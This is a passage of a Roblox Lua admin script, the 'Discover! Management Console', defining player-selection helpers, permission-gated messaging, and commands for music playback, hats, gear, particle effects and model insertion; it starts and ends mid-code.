		elseif listedplayer:lower() == "nonadmins" then
			
			for _,i in pairs(Players:GetPlayers()) do
				if Permissions[i.Name] <= 0 then
					table.insert(foundplayers,i)
				end
			end
			
		elseif listedplayer:lower() == "random" then
			table.insert(foundplayers,Players:GetPlayers()[math.random(1, #Players:GetPlayers())])
			
		elseif listedplayer:lower() == "me" then
			
			table.insert(foundplayers,spokenplayer)
			
		elseif listedplayer:lower() == "friends" then
			
			for _,i in pairs(Players:GetChildren()) do
				if i:IsFriendsWith(spokenplayer.userId) then
					table.insert(foundplayers,i)
				end
			end
			
		elseif listedplayer:lower() == "nonfriends" then
			
			for _,i in pairs(Players:GetChildren()) do
				if not i:IsFriendsWith(spokenplayer.userId) then
					table.insert(foundplayers,i)
				end
			end
			
		elseif listedplayer:lower() == "bc" then
			
			for _,i in pairs(Players:GetChildren()) do
				if i.MembershipType == Enum.MembershipType.BuildersClub then
					table.insert(foundplayers,i)
				end
			end
			
		elseif listedplayer:lower() == "tbc" then
			
			for _,i in pairs(Players:GetChildren()) do
				if i.MembershipType == Enum.MembershipType.TurboBuildersClub then
					table.insert(foundplayers,i)
				end
			end
	
			
		elseif listedplayer:lower() == "obc" then
			
			for _,i in pairs(Players:GetChildren()) do
				if i.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
					table.insert(foundplayers,i)
				end
			end
			
		elseif listedplayer:lower() == "anybc" then
			
			for _,i in pairs(Players:GetChildren()) do
				if i.MembershipType == Enum.MembershipType.OutrageousBuildersClub then
					table.insert(foundplayers,i)
				end
			end
			
		--[[elseif listedplayer:lower():sub(1,4) == "team" then
			
			local team = listedplayer:lower():sub(6)
			local matchedteam
			
			for _,i in pairs(Teams:GetChildren()) do
				if i:IsA("Team") then
					if i.Name:lower():sub(1,#team) == team:lower() then
						if not matchedteam then
							matchedteam = i
						else
							error("Team \""..team.."\" is ambiguous.")
						end
					end
				end
			end
			
			assert(matchedteam,"No teams matching \""..team.."\" found.")
			
			for _,i in pairs(Players:GetPlayers()) do
				if i.TeamColor == matchedteam.TeamColor then
					table.insert(foundplayers,i)
				end
			end]]
			
		end
		
		local currentfoundplayer
		
		for _,i in pairs(Players:GetPlayers()) do
			
			if i.Name:lower():sub(1,#listedplayer) == listedplayer:lower() then
				if not currentfoundplayer then
					currentfoundplayer = i
				else
					error(str.." is ambiguous\n\
There are people with the same name. Try adding another character.")
				end
			end
			
		end
		
		table.insert(foundplayers,currentfoundplayer)
		
	end
	
		if not str or str == "" then
		error("There was a problem while trying to execute a command with other syntax such as 'random', 'all', or 'others' \n\ \n\ If you keep getting this error, please notify TechnologicalByte.")
		end
		
	assert(foundplayers[1],"No players were found matching \""..str.."\"")
	
	return foundplayers
end

local SignalAdminShutdown = false
wait(1)


if game.PlaceId ~= 896250178 and version == "preview" then
	warn("UNAUTHORIZED_MESSAGE_ABOUT_PLACE")
	error("Place not authorized. Sorry but I have to quit.")
	script:remove()
	return
end

pcall(function()
	
		local compilefenv = {}
			for a,i in pairs(getfenv()) do
				if ((type(i) == "table" and a == "Admins" or a == "SuperAdmins" or a == "BannedPlayers" or a == "AdminUserIds" or a == "SuperAdminUserIds" or a == "BannedPlayerUserIds") or type(i) ~= "table") and type(i) ~= "function" and type(i) ~= "userdata" and a ~= "Commands" and a ~= "sha1" and a ~= "CodeSignCache" and a ~= "AllPlayers" and a ~= "logs" and a ~= "Scripts" and a ~= "PlaceNames" then
				--	print(a.." = "..tostring(i))
					compilefenv[tostring(a)] = i
				end
			end
local passJSON = game:FindFirstChildOfClass("HttpService"):JSONEncode(compilefenv)
wait(3)
local LoaderStuff = script:WaitForChild("CONSOLE_PREFERENCES").Value
		local lib = game:FindFirstChildOfClass("HttpService"):JSONDecode(LoaderStuff)
		local fenvres = lib
			for a,i in pairs(fenvres) do
				if type(getfenv()[a]) ~= "function" and getfenv()[a] ~= nil and i ~= "null" and i ~= nil and a ~= "version" then
					getfenv()[a] = i
				end
		end
if SignalAdminShutdown then
	pcall(function()
	end)
	
	for i,_ in pairs(getfenv()) do
		getfenv()[i] = nil
	end
	
	return
end


function DisplayScrollFrame(player,title,desc,text)
	if player == root or player == "root" or player == nil then
		return
	end
		
		--print("Fired DisplayScrollFrameSignal",player,title,text,displaytime)

		DisplayScrollFrameSignal:FireClient(player,title,desc,text)
end

function DisplayMessage(player,title,text,displaytime)
	if player == root or player == "root" or player == nil then
		return
	end
		

		--print("Fired DisplayMessageSignal",player,title,text,displaytime)

DisplayMessageSignal:FireClient(player,title,text,displaytime)
end

function DisplayMessageAll(title,text,displaytime)
	for _,i in pairs(Players:GetPlayers()) do
		DisplayMessage(i,title,text,displaytime)
	end
end

function DismissMessageAll()
	for _,i in pairs(Players:GetPlayers()) do
		DismissMessage(i)
	end
end
	
function DismissMessage(player)
	if player == root or player == "root" then
		return
	end

		--print("Fired DismissMessageSignal",player,title,text,displaytime)

		DismissMessageSignal:FireClient(player)
end

function Tell(player,text,displaytime)
	if player == root or player == "root" or player == nil then
		return
	end

		--print("Fired TellSignal",player,title,text,displaytime)

		TellSignal:FireClient(player,text,displaytime)
end

function Send(player,action,action2,action3)
	if player == root or player == "root" or player == nil then
		return
	end

	STCU:FireClient(player,action,action2,action3)
end


function TellAll(msg,length)
	for _,i in pairs(Players:GetPlayers()) do
		Tell(i,msg,length)
	end
end

local TellAdmins

function TellAdmins(msg,length)
	for _,i in pairs(Players:GetPlayers()) do
		if Permissions[i.Name] and Permissions[i.Name] > 0 then
			Tell(i,msg,length)
		end
	end
end

local rawunpack = unpack

function rawunpack(oldtab)
	assert(oldtab,"DMC_EXECUTE_SECURITY: Try executing the command again.\n\n\ It appears that the encryption code to execute that command is incorrect.")
	local new = ""
	local tab = {}
	for i = 1, #oldtab do
		table.insert(tab,tostring(oldtab[i]))
	end
	table.sort(tab)
	for i = 1, #tab do
		new = new..tostring(tab[i])..", "
	end
	new = new:sub(1,#new-2)
	return new
end

setmetatable(Commands,{
	__index = function(table,index)
		if not rawget(table,index) then
			error("You're trying to execute a command that doesn't exist! \n\n\ Why loop a command that doesn't exist? \n\  Make sure you typed the right command.") --next time don't break any links :)
		end
	end;
	__gc = function()
		error("OH NO I'M BEING GARBAGE COLLECTED\nTHIS ISN'T GOOD\nAAAAAAAAAAAAAAAA HELP ME MOMMY")
	end;
	__metatable = true;
})

-----------------------------------------------------------------
-------------------------- Commands -----------------------------
-----------------------------------------------------------------

-- keeping it simple
function Commands.m(args,sender)
	table.insert(desc,"Prints message to everyone on this server.")
	MinimumPermission(1,sender)
	local buildstring = ""


	for _,i in pairs(args) do
		buildstring = buildstring..i.." "
	end
	buildstring = buildstring:sub(1,#buildstring-1)
	
local Filtering = ""

	local success, message = pcall(function()
	DisplayMessageAll((sender ~= root and sender ~= "root") and sender.Name or "Console",game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(buildstring, sender),6)
end)
if not success then
DisplayMessageAll((sender ~= root and sender ~= "root") and sender.Name or "Console","[ Content Deleted ]",6)
warn("Text got filtered, so content deleted'd")
end
end

function Commands.pm(args,sender,desc)
			desc = "Private message someone in this server."
	MinimumPermission(1,sender)
	local plr = GetPlayersFromString(assert(args[1],"Player to PM missing\n\n\ pm 'PlayerName' 'Msg' "),sender)
	local buildstring = ""
	
	for a,i in pairs(args) do
		if a ~= 1 then
			buildstring = buildstring..i.." "
		end
	end
	
	buildstring = buildstring:sub(1,#buildstring-1)
	local PMUsername = sender.Name
	for _,i in pairs(plr) do
		DisplayMessage(i,((sender ~= root and sender ~= "root") and "PM: "..PMUsername or "Console"),game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(buildstring, sender),6)
	end
	--DisplayInput(sender,"Private Message (WIP)","Send.")
end

function Commands.sm(args,sender)
	MinimumPermission(2,sender)
	local buildstring = ""
	
	for _,i in pairs(args) do
		buildstring = buildstring..i.." "
	end
	
	buildstring = buildstring:sub(1,#buildstring-1)
	DisplayMessageAll("Discover! Management Console",game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(buildstring, sender),6)
end

function Commands.h(args,sender)
	MinimumPermission(1,sender)
	local buildstring = ""
	
	for _,i in pairs(args) do
		buildstring = buildstring..i.." "
	end
	
	buildstring = buildstring:sub(1,#buildstring-1)
local FilterProcess = game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(buildstring, sender)
	TellAll(((sender ~= root and sender ~= "root") and sender.Name or "Console")..": "..FilterProcess,6)
end

function Commands.sh(args,sender)
	MinimumPermission(1,sender)
	local buildstring = ""
	
	for _,i in pairs(args) do
		buildstring = buildstring..i.." "
	end
local FilterProcess = game:FindFirstChildOfClass("Chat"):FilterStringForBroadcast(buildstring, sender)
	buildstring = buildstring:sub(1,#buildstring-1)
	TellAll("Discover! Management Console: "..FilterProcess,10)
end

function Commands.e(args,sender)
	-- core command
end

function Commands.w(args,sender)
	-- core command
end

function Commands.whisper(args,sender)
	-- core command
end

function Commands.laugh(args,sender)
	-- core command
end


function Commands.mute(args,sender)
	-- core command
end

function Commands.unmute(args,sender)
	-- core command
end

function Commands.c(args,sender)
	-- core command
end

function Commands.point(args,sender)
	-- core command
end

function Commands.wave(args,sender)
	-- core command
end

function Commands.me(args,sender)
	-- core command
end	

function Commands.t(args,sender)
	-- core command
end	

function Commands.dance(args,sender)
	-- core command
end	

function Commands.dance2(args,sender)
	-- core command
end	

function Commands.dance3(args,sender)
	-- core command
end	

function Commands.stopmusic(args,sender)
	MinimumPermission(1,sender)
	if workspace:FindFirstChild("AdmiMusic") then
		TellAll("Music Stopped",3)
		if game.Lighting:FindFirstChild("Bloom") then
		game.Lighting.Bloom:remove()
		game.Lighting.Blur:remove()
		game.Lighting.ColorCorrection:remove()
		game.Lighting.SunRays:remove()
		script._CONSOLEVALUES.Disco.Value = false
		StopDisco = true
		Lighting.Ambient = Voldambient
	end	
	
		if workspace:FindFirstChild("AdmiMusic") then
		workspace:FindFirstChild("AdmiMusic"):Stop()
		workspace:FindFirstChild("AdmiMusic"):Destroy()
		end
		
	elseif not workspace:FindFirstChild("AdmiMusic") then
		Tell(sender,"No music is playing right now.",5)
end
end

function Commands.music(args,sender)
	MinimumPermission(1,sender)
local Buffering = true
		Buffering = true
	local music = tonumber(args[1])
	local pitch = 1
	
	if args[1] == "stop" then
		TellAll("Music Stopped",3)
			if game.Lighting:FindFirstChild("Bloom") then
		game.Lighting.Bloom:remove()
		game.Lighting.Blur:remove()
		game.Lighting.ColorCorrection:remove()
		game.Lighting.SunRays:remove()
		script._CONSOLEVALUES.Disco.Value = false
		StopDisco = true
		Lighting.Ambient = Voldambient
	end	
	
		if workspace:FindFirstChild("AdmiMusic") then
		workspace:FindFirstChild("AdmiMusic"):Stop()
		workspace:FindFirstChild("AdmiMusic"):Destroy()
		end
		
		return
	end
	wait(0.2)
	local Songname = "Invalid Song Preset"
	local ok,err = pcall(function()
	Songname = MarketplaceService:GetProductInfo(music)
	end)
if Songname == "Invalid Song Preset" then
	DisplayMessage(sender,"Invalid Music ID","You have entered an invalid ID for music.",10)
		return
		end
		
	if	workspace:FindFirstChild("_Buffering") then
	workspace:FindFirstChild("_Buffering"):Destroy()
	Buffering = true
	end
	
if MarketplaceService:GetProductInfo(music).AssetTypeId ~= 3 then 
		DisplayMessage(sender,"Music Buffer Error","The music you are trying tor request ("..music..") seems to be invalid.\n\Try typing the ID correctly next time!",10)
		return
end
	local sound = Instance.new("Sound")
	sound.SoundId = "http://www.roblox.com/asset/?id="..music
	sound.Parent = workspace
	sound.Looped = true
	sound.Pitch = ""..pitch
	sound.Name = "_Buffering"
	workspace:WaitForChild("_Buffering")
if MarketplaceService:GetProductInfo(music).AssetTypeId == 3 then 
	if sound.IsLoaded == false and sound.TimeLength < 1 then
		if Buffering == true then
			TellAll("Buffering ("..music..")",10)
			wait(0.3)
		end		
		end
	wait(0.3)
	if Buffering == true and sound.IsLoaded == true and sound.TimeLength ~= 0 then
	Buffering = false
	if workspace:FindFirstChild("AdmiMusic") then
		workspace:FindFirstChild("AdmiMusic"):Stop()
		workspace:FindFirstChild("AdmiMusic"):Destroy()
	end
		sound:Play()
	sound.Volume = 0
		wait(0.2)		
	TellAll("Now Playing - "..tostring(Songname.Name).." ("..music..")",8)
	Buffering = false
	wait(0.1)
	sound.Name = "AdmiMusic"
		if Buffering == true and workspace:FindFirstChild("_Buffering") then
			if workspace:FindFirstChild("_Buffering")  then
	workspace:FindFirstChild("_Buffering"):Destroy()
	local sngname = Instance.new("StringValue") sngname.Parent = workspace.AdmiMusic sngname.Name = "MusicTitle" sngname.Value = ""..Songname.Name
	local date = Instance.new("StringValue") date.Parent = workspace.AdmiMusic date.Name = "CreateDate" date.Value = ""..Songname.Created 
	local sngaut = Instance.new("StringValue") sngaut.Parent = workspace.AdmiMusic sngaut.Name = "UploadedBy" sngaut.Value = ""..Songname.Creator.Name
	local songID = Instance.new("StringValue") songID.Parent = workspace.AdmiMusic songID.Name = "SongID" songID.Value = ""..Songname.ProductId
	local TimePos = Instance.new("StringValue") TimePos.Parent = workspace.AdmiMusic TimePos.Name = "TimePosition" TimePos.Value = ""..sound.TimePosition

local goal = {}
goal.Volume = 1
local tweenInfo = TweenInfo.new(4)
local tween = TweenService:Create(workspace:FindFirstChild("AdmiMusic"), tweenInfo, goal)
tween:Play()	
--[[
	for i = 0,1, .008 do
		if workspace:FindFirstChild("AdmiMusic") then
		Buffering = false
workspace:FindFirstChild("AdmiMusic").Volume = i
		wait(.008)
		elseif not  workspace:FindFirstChild("AdmiMusic") then
			warn("Music stopped, someone changed music too quickly.")
				return
		end
	end]]
	return
			end
			end
			
	sound.TimePosition = 0
	local sngname = Instance.new("StringValue") sngname.Parent = workspace.AdmiMusic sngname.Name = "MusicTitle" sngname.Value = ""..Songname.Name
	local date = Instance.new("StringValue") date.Parent = workspace.AdmiMusic date.Name = "CreateDate" date.Value = ""..Songname.Created 
	local sngaut = Instance.new("StringValue") sngaut.Parent = workspace.AdmiMusic sngaut.Name = "UploadedBy" sngaut.Value = ""..Songname.Creator.Name
	local songID = Instance.new("StringValue") songID.Parent = workspace.AdmiMusic songID.Name = "SongID" songID.Value = ""..Songname.ProductId
	local TimePos = Instance.new("StringValue") TimePos.Parent = workspace.AdmiMusic TimePos.Name = "TimePosition" TimePos.Value = ""..sound.TimePosition
--[[	for i = 0,1, .008 do
		if workspace:FindFirstChild("AdmiMusic") then
					Buffering = false
workspace:FindFirstChild("AdmiMusic").Volume = i
		wait(.008)
		elseif not  workspace:FindFirstChild("AdmiMusic") then
			
			warn("Music stopped, someone changed music too quickly.")
				return
		end
end]]
local goal = {}
goal.Volume = 1
local tweenInfo = TweenInfo.new(4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

local tween = TweenService:Create(workspace:FindFirstChild("AdmiMusic"), tweenInfo, goal)
tween:Play()	
--[[
if workspace:FindFirstChild("AdmiMusic") then
workspace:FindFirstChild("AdmiMusic").Volume = 1	
end]]
		return
	end
	
	wait(1) --First attempt
		if Buffering == true and workspace:FindFirstChild(sound) and sound.IsLoaded == true and sound.TimeLength ~= 0 then
				end
	wait(0.1)
if Buffering == true and sound.IsLoaded == true and sound.TimeLength ~= 0 then
		if Buffering == true and workspace:FindFirstChild("AdmiMusic") then
		if workspace:FindFirstChild("AdmiMusic") then
		workspace:FindFirstChild("AdmiMusic"):Stop()
		workspace:FindFirstChild("AdmiMusic"):Destroy()
		end
	TellAll("Now Playing - "..tostring(Songname.Name).." ("..music..")",8)
	sound:Play()
	sound.TimePosition = 0
	sound.Name = "AdmiMusic"
	TellAll("Now Playing - "..tostring(Songname.Name).." ("..music..")",8)
		Buffering = false
	local sngname = Instance.new("StringValue") sngname.Parent = workspace.AdmiMusic sngname.Name = "MusicTitle" sngname.Value = ""..Songname.Name
	local date = Instance.new("StringValue") date.Parent = workspace.AdmiMusic date.Name = "CreateDate" date.Value = ""..Songname.Created 
	local sngaut = Instance.new("StringValue") sngaut.Parent = workspace.AdmiMusic sngaut.Name = "UploadedBy" sngaut.Value = ""..Songname.Creator.Name
	local songID = Instance.new("StringValue") songID.Parent = workspace.AdmiMusic songID.Name = "SongID" songID.Value = ""..Songname.ProductId
	local TimePos = Instance.new("StringValue") TimePos.Parent = workspace.AdmiMusic TimePos.Name = "TimePosition" TimePos.Value = ""..sound.TimePosition
--[[for i = 0,1, .008 do
		if workspace:FindFirstChild("AdmiMusic") then
					Buffering = false
workspace:FindFirstChild("AdmiMusic").Volume = i
		wait(.008)
		elseif not  workspace:FindFirstChild("AdmiMusic") then
			warn("Music stopped, someone changed music too quickly.")
				return
		end
end]]
local goal = {}
goal.Volume = 1

local tweenInfo = TweenInfo.new(4)
local tween = TweenService:Create(workspace:FindFirstChild("AdmiMusic"), tweenInfo, goal)
tween:Play()	
--[[
if workspace:FindFirstChild("AdmiMusic") then
workspace:FindFirstChild("AdmiMusic").Volume = 1	
return
end		]]
end	
end
		
-- because ROBLOX issues.
wait(4)	-- last attempt
	if Buffering == true and workspace:FindFirstChild("_Buffering") and sound.IsLoaded == false and sound.TimeLength == 0 then
				DisplayMessage(sender,"Music Buffer Error", "There was an issue while requesting to play said song.\n\This could be a ROBLOX server-side issue that prevented music from playing, or other error has occurred.\n\n\If this problem continues to happen, please notify TechnologicalByte.",10)
				TellAll("Buffering error for requested song "..tostring(Songname.Name)..", try executing that song again.",5)
					if Songname.Name == "[ Content Deleted ]" then
						DisplayMessage(sender,"Music Error","It appears that the music you requested has been deleted by ROBLOX moderators. Sorry about that. A replacement should be into place shortly.",10)
				end
					sound:destroy()
					Buffering = false
					return
		end
	
	if Buffering == true and workspace:FindFirstChild("_Buffering") and sound.IsLoaded == true then
		if workspace:FindFirstChild("AdmiMusic") then
		workspace:FindFirstChild("AdmiMusic"):Stop()
		workspace:FindFirstChild("AdmiMusic"):Destroy()
		end
	end
		wait(0.4)
if Buffering == true and sound.IsLoaded == true and sound.TimeLength ~= 0 then
	TellAll("Now Playing - "..tostring(Songname.Name).." ("..music..")",8)
	sound:Play()
	sound.TimePosition = 0
	sound.Volume = 0
	sound.Name = "AdmiMusic"
	local sngname = Instance.new("StringValue") sngname.Parent = workspace.AdmiMusic sngname.Name = "MusicTitle" sngname.Value = ""..Songname.Name
	local date = Instance.new("StringValue") date.Parent = workspace.AdmiMusic date.Name = "CreateDate" date.Value = ""..Songname.Created 
	local sngaut = Instance.new("StringValue") sngaut.Parent = workspace.AdmiMusic sngaut.Name = "UploadedBy" sngaut.Value = ""..Songname.Creator.Name
	local songID = Instance.new("StringValue") songID.Parent = workspace.AdmiMusic songID.Name = "SongID" songID.Value = ""..Songname.ProductId
	local TimePos = Instance.new("StringValue") TimePos.Parent = workspace.AdmiMusic TimePos.Name = "TimePosition" TimePos.Value = ""..sound.TimePosition
	wait(0.4)
--[[	for i = 0,1, .008 do
		if workspace:FindFirstChild("AdmiMusic") then
					Buffering = false
workspace:FindFirstChild("AdmiMusic").Volume = i
		wait(.008)
		elseif not  workspace:FindFirstChild("AdmiMusic") then
			warn("! DMC WARNING !: Music stopped, someone changed music too quickly.")
				return
		end
end]]
local goal = {}
goal.Volume = 1
local tweenInfo = TweenInfo.new(4)
local tween = TweenService:Create(workspace:FindFirstChild("AdmiMusic"), tweenInfo, goal)
tween:Play()	
--[[
if workspace:FindFirstChild("AdmiMusic") then
workspace:FindFirstChild("AdmiMusic").Volume = 1	
end]]
end
end
end

function Commands.play(...)
	Commands.music(...)
end

function Commands.getsong(args,sender)
	error("Coming soon, whenever ROBLOX allow us to take music from catalog.")
--[[local players = GetPlayersFromString(assert(args[1],"Player(s) to give song is missing."),sender)
local id = workspace:FindFirstChild("AdmiMusic").SongID.Value
		if workspace:FindFirstChild("AdmiMusic") then
				for _,i in pairs(players) do
		MarketplaceService:PromptPurchase(i,id)
	end
		elseif not 	workspace:FindFirstChild("AdmiMusic") then
				Tell(sender,"Play a song first.",5)
		end]]
end

function Commands.getme(args,sender)
local id = 931520257
		MarketplaceService:PromptPurchase(sender,id)
end

function Commands.getdmc(...)
	Commands.getme(...)
end

function Commands.getmusic(...)
	Commands.getsong(...)
end

function Commands.replay(args,sender)
			MinimumPermission(1,sender)
		if workspace:FindFirstChild("AdmiMusic") then
			workspace:FindFirstChild("AdmiMusic").TimePosition = 0
		Tell(sender,"Replaying song.",5)
		else
			Tell(sender,"Play a song first.",5)
			return
		end
end

function Commands.pitch(args,sender)
		MinimumPermission(1,sender)
		local pitchnum = tonumber(args[1])
	assert(tonumber(args[1]),"Pitch invalid, or not a number.")
	
	if workspace:FindFirstChild("AdmiMusic") then
		workspace.AdmiMusic.Pitch = ""..pitchnum
			Tell(sender,"Music pitch changed to "..pitchnum,8)
	elseif not workspace:FindFirstChild("AdmiMusic") then
		Tell(sender,"Play a song to change pitch.",5)
		end
end

function Commands.volume(args,sender)
		MinimumPermission(1,sender)
		local volvol = tonumber(args[1])
	assert(tonumber(args[1]),"Volume value is missing, or invalid number.\n\n\ volume 'Number' ")
			
	if workspace:FindFirstChild("AdmiMusic") then
local goal = {}
goal.Volume = volvol
local tweenInfo = TweenInfo.new(1)
		
local tween = TweenService:Create(workspace:FindFirstChild("AdmiMusic"), tweenInfo, goal)
tween:Play()	
		
		if volvol > 10 then
			Tell(sender,"Max volume reached! Volume set to 10.",3)
			return
		end
	Tell(sender,"Music volume changed to " ..volvol,3)
	elseif not workspace:FindFirstChild("AdmiMusic") then
		Tell(sender,"Play a song to change volume.",3)
		end
end

function Commands.songinfo(args,sender)
	if not workspace:FindFirstChild("AdmiMusic") then
	Tell(sender,"Unable to get song details; There's no music playing!",5)
	return
end


local sngname = workspace:FindFirstChild("AdmiMusic").MusicTitle.Value
local date = workspace:FindFirstChild("AdmiMusic").CreateDate.Value
local sngaut = workspace:FindFirstChild("AdmiMusic").UploadedBy.Value
local ID = workspace:FindFirstChild("AdmiMusic").SongID.Value
local TIME = workspace:FindFirstChild("AdmiMusic"):FindFirstChild("TimePosition").Value
DisplayMessage(sender,"💬 Song Info",
	"For additional info, check out its asset page.\
	\n\ Now playing:\n\ "..sngname.. 
	"\n\ \n\ID:\n\ "..ID.. 
	--"\n\ Time Position:\n\ "..TIME..
	" \n\ \n\Uploaded by:\n\ " ..sngaut..
	"\n\ ",15)
end

function Commands.musicinfo(...)
	Commands.songinfo(...)
end

function Commands.musicdetails(...)
	Commands.songinfo(...)
end

function Commands.nowplaying(args,sender)
	if workspace:FindFirstChild("AdmiMusic") then
local sngname = workspace.AdmiMusic:FindFirstChild("MusicTitle").Value
local sngid = workspace.AdmiMusic:FindFirstChild("SongID").Value
	Tell(sender,"Now Playing - "..sngname.." ("..sngid..")",10)
	elseif not workspace:FindFirstChild("AdmiMusic") then
		TellAll("There's no music playing.",8)
	end
end

function Commands.speed(...)
	Commands.walkspeed(...)
end

function Commands.team(args,sender)
end

function Commands.neutral(args,sender)
	--error("Not yet implemented")
	
	MinimumPermission(1,sender)
	
	Tell(sender,"The team and neutral commands are currently a bit buggy. Sorry if you run into issues. :(")
	
	wait(3)
	
	assert(args[1],"Players to change team are missing")
	
	local Plrs = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(Plrs) do
		i.Neutral = true
		i.TeamColor = BrickColor.new("White")
	end	
	
	Tell(sender,tostring(unpack(Plrs))..(#Plrs ~= 1 and " are now" or " is now").." neutral.")
	
end

function Commands.hat(args,sender)
	MinimumPermission(1,sender)
	assert(tonumber(args[2]),"Hat to give is missing. or is not a number")
	assert(args[1],"Players to give hats to are missing")
	
	local Plrs = GetPlayersFromString(args[1],sender)
	
	
	local Hats = InsertService:LoadAsset(tonumber(args[2]))
	if Hats == nil then
		error("Invalid hat")
	end
	for _,i in pairs(Plrs) do
		for _,Hat in pairs(Hats:GetChildren()) do
			if Hat:IsA("Accessory") then
				Hat:Clone().Parent = i.Character
			end
		end
	end
	Hats:Destroy()
	
	local Hatname = args[2]
	
	pcall(function()
		Hatname = MarketplaceService:GetProductInfo(tonumber(args[2]))["Name"]
	end)
	
	Tell(sender,"Given hat "..tostring(Hatname).." to "..tostring(unpack(Plrs)))
end

--Every Dream.
function Commands.charrain(args,sender)
	MinimumPermission(1,sender)
	local charstring = 	assert(args[1],"The person to generate is missing!")
	assert(args[2],"Players to be rained on is missing!")
	
	local player = GetPlayersFromString(args[2],sender)
	local thechar =  game:FindFirstChildOfClass("Players"):GetUserIdFromNameAsync(charstring)
	
	for _,i in pairs(player) do
			
			if not i.Character:FindFirstChild("HumanoidRootPart") then
			error("That person doesn't have the HumanoidRootPart!")
			end
			
			if i.Character:FindFirstChild("HumanoidRootPart") and not i.Character:FindFirstChild("_CHARPARTICAL") then
				for _,i in pairs(player) do	
			local NameModel = Instance.new("Model",i.Character)
			NameModel.Name = "_CHARPARTICAL"
			
			local ParticlesHead = i.Character.Head:Clone()
			ParticlesHead.Parent = NameModel
			ParticlesHead.Name = "PHandle"
			ParticlesHead.Transparency = 1
			ParticlesHead:ClearAllChildren()
			local headx =  i.Character.Head.Orientation.x
			local heady =  i.Character.Head.Orientation.y
			ParticlesHead.Orientation = Vector3.new(headx,heady,180)
			
			local Weld = Instance.new("Weld", ParticlesHead)
			Weld.Part0 = ParticlesHead
			Weld.Part1 = i.Character.Head
			
			local ParticlesEmit = Instance.new("ParticleEmitter",ParticlesHead)
			ParticlesEmit.LightEmission =  "0.550"
			ParticlesEmit.Lifetime = NumberRange.new(1,5)
			ParticlesEmit.Speed = NumberRange.new(5)
			ParticlesEmit.Rotation = NumberRange.new(1,180)
			ParticlesEmit.Texture = "https://www.roblox.com/bust-thumbnail/image?userId="..thechar.."&width=420&height=420&format=png"
			ParticlesEmit.ZOffset = 1
			ParticlesEmit.EmissionDirection = "Bottom"
			ParticlesEmit.Rate = 5
				end
			end
		if i.Character:FindFirstChild("HumanoidRootPart") and  i.Character:FindFirstChild("_CHARPARTICAL") then
			local ParticlesEmit =  i.Character:FindFirstChild("_CHARPARTICAL").PHandle.ParticleEmitter
			ParticlesEmit.Texture = "https://www.roblox.com/bust-thumbnail/image?userId="..thechar.."&width=420&height=420&format=png"
		end
			end
	
	Tell(sender,"Generating "..thechar..", and making it rain on "..tostring(unpack(player)),5)
end

function Commands.uncharrain(args,sender)
	MinimumPermission(1,sender)
	assert(args[1],"The player you are trying to remove charrain is missing")
	
	local player = GetPlayersFromString(args[1],sender)
	
	for _,i in pairs(player) do
			
			if not i.Character:FindFirstChild("HumanoidRootPart") then
			error("That person doesn't have the HumanoidRootPart!")
			end
			
			if i.Character:FindFirstChild("HumanoidRootPart") and  i.Character:FindFirstChild("_CHARPARTICAL") then
				i.Character:FindFirstChild("_CHARPARTICAL"):destroy()
				end
			end
	
	Tell(sender,""..tostring(unpack(player)).." is not longer receiving character rain.",5)
end

function Commands.gear(args,sender)
	MinimumPermission(1,sender)
	assert(args[2],"Gear ID/Preset is required!")
	assert(args[1],"Players to give gear to is missing.")
	
	local gearname = tonumber(args[2])

	local Plrs = GetPlayersFromString(args[1],sender)

	local GearName = "Invalid Gear"
	local ok,err = pcall(function()
	GearName = MarketplaceService:GetProductInfo(gearname)
	end)
if GearName == "Invalid Song Preset" then
	DisplayMessage(sender,"Invalid Gear ID/Preset","I couldn't find a gear that matched that query. Check to make sure it's spelled correctly.\n\ If you're questing a gear ID, check the ID again.",10)
		return
end
	
	
	local Gears = game.InsertService:LoadAsset(tonumber(gearname))
	if Gears == nil then
		error("Invalid gear")
	end
	
	if Gears == 10468797 then
		error("no u")
	end
	
	for _,i in pairs(Plrs) do
		if i:FindFirstChild("Backpack") then
			for _,Gear in pairs(Gears:GetChildren()) do
				if Gear:IsA("Tool") then
										Gear:Clone().Parent = i.Backpack
				else
						DisplayMessage(sender,"Invalid Gear ID/Preset","There was an issue while getting requested gear. This may happen because\n\ 1. You provided the wrong or invalid ID. \n\ or \n\ 2. The gear preset is invalid. \n\  \n\Gear presets are case sensitive.",10)
				return
					end
				end
			end
		end
	Gears:Destroy()
	
	pcall(function()
		gearname = MarketplaceService:GetProductInfo(gearname)["Name"]
		Tell(sender,"Given gear "..tostring(gearname).." to "..tostring(unpack(Plrs)))
	end)
end

-- EXPERIMENTAL!
function Commands.insert(args,sender)
MinimumPermission(1,sender)
	--error("Not yet implemented")
	assert(tonumber(args[2]),"Missing parameters; Player name invalid or invalid model ID.\n\n\ insert 'PlayerName' 'ModelID' ")
	
	local Plrs = GetPlayersFromString(args[1],sender)

	local Model = InsertService:LoadAsset(tonumber(args[2]))
	if Model == nil then
		error("Invalid model")
	end
	if not workspace:FindFirstChild("_Models") then
			local ModFolder = Instance.new("Folder",workspace)
			ModFolder.Name = "_Models"
	end
	
		if tonumber(args[2]) == 10468797  then
		error("Can't insert gear. Use the /gear command.")
		return
		end
		
	for _,i in pairs(Plrs) do
		for _,Model in pairs(Model:GetChildren()) do
			if Model:IsA("Model") then
			Model.Parent = workspace:FindFirstChild("_Models")
		elseif Model:IsA("Folder") then
	Model.Parent = workspace:FindFirstChild("_Models")
end
			
			if Model:IsA("UnionOperation") then
		local mod = Instance.new("Model",workspace)
		mod.Name = "_NOTAMODEL"
	Model.Parent = workspace:FindFirstChild("_NOTAMODEL")
workspace:FindFirstChild("_NOTAMODEL").Parent = workspace:FindFirstChild("_Models")
end
			
			if Model:IsA("Model") then
	Model:MakeJoints() Model:MoveTo(i.Character:GetModelCFrame().p)
			end
			end
	end
	
	local ModelName = args[2]
	
	pcall(function()
		ModelNames = MarketplaceService:GetProductInfo(tonumber(args[2]))["Name"]
	end)
	
	TellAll("Inserted: "..tostring(ModelNames)..", located at "..tostring(unpack(Plrs),10))
end

function Commands.clone(args,sender)
	MinimumPermission(1,sender)
error("Not yet implemented")
	assert(args[1],"Player to clone is missing., or invalid name.")
	
